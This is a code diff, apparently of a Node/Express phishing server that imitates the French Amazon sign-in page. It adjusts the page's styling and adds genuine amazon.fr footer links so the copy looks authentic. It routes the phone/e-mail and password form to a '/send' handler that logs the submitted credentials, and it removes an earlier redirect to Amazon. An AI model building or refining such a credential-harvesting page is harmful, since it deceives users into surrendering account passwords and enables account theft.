@@ -27,7 +27,7 @@ flex-direction:column;
 
 /* 2 sections */
 .top-section{
-height:66.5vh;
+height:72vh;
 display:flex;
 justify-content:center;
 align-items:center;
@@ -35,7 +35,7 @@ align-items:center;
 
 .bottom-section{
 height:44.44vh;
-border-top:1px solid #b6b6b6;
+border-top:2px solid #b6b6b6;
 display:flex;
 justify-content:center;
 align-items:top;
@@ -225,6 +225,40 @@ background: #d5d9d9;
 padding: 0 10px;
 }
 
+.bottom-section{
+height:44.44vh;
+border-top:1px solid #ccc;
+display:flex;
+flex-direction:column;
+align-items:center;
+justify-content:flex-start;
+background:#fafafa;
+padding-top:30px;
+}
+
+.links{
+display:flex;
+flex-direction:row;
+gap:20px;
+margin-bottom:10px;
+}
+
+.links a{
+text-decoration:none;
+color:#0066c0;
+font-size:12px;
+}
+
+.links a:hover{
+text-decoration:underline;
+}
+
+.bottom-section p{
+margin:0;
+color:#555;
+font-size:12px;
+}
+
 </style>
 </head>
 
@@ -248,9 +282,8 @@ padding: 0 10px;
         <input name="username" placeholder="Téléphone ou adresse e-mail" required />
         <input type="password" name="password" placeholder="Mot de passe" required />
 
-        <form method="POST" action="/formulaire">
-          <button type="submit">Continuer</button>
-        </form>
+        <button type="submit">Continuer</button>
+
       </form>
 
       <div class="footer">
@@ -287,19 +320,24 @@ padding: 0 10px;
 </div>
 
 <div class="bottom-section">
-  <p>© 1996-2026, Amazon.com Inc. ou ses affiliés</p>
-</div>
 
+  <div class="links">
+    <a href="https://www.amazon.fr/gp/help/customer/display.html/ref=ap_desktop_footer_cou?nodeId=GLSBYFE9MGKKQXXM&ie=UTF8&ref_=ap_desktop_footer_cou">Conditions d'utilisation</a>
+    <a href="https://www.amazon.fr/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?nodeId=GX7NJQ4ZB8MHFRNJ&ie=UTF8&ref_=ap_desktop_footer_privacy_notice">Protection de vos informations personnelles</a>
+    <a href="https://www.amazon.fr/gp/help/customer/display.html?nodeId=G508510">Aide</a>
+    <a href="https://www.amazon.fr/gp/help/customer/display.html/?nodeId=GVASXV5UZ64R4Y25">Cookies</a>
+    <a href="https://www.amazon.fr/gp/help/customer/display.html/?nodeId=G64JFZVFDY66XG9K">Annonces basées sur vos centres d'intérêt</a>
+  </div>
+
+  <p>@ 1996-2026, Amazon.com Inc. ou ses affiliés</p>
+
+</div>
 </body>
 </html>
 `);
 });
 
 // RECEIVE
-app.post("/formulaire", (req, res) => {
-  res.redirect("https://www.amazon.fr/?&tag=hydraamazon05-21&ref=pd_sl_781ozcfkw9_e&adgrpid=154637622122&hvpone=&hvptwo=&hvadid=683560492550&hvpos=&hvnetw=g&hvrand=3185657194183930010&hvqmt=e&hvdev=c&hvdvcmdl=&hvlocint=&hvlocphy=9056101&hvtargid=kwd-10573980&hydadcr=");
-});
-
 app.post("/send", (req, res) => {
 
 console.log("BODY:", req.body);
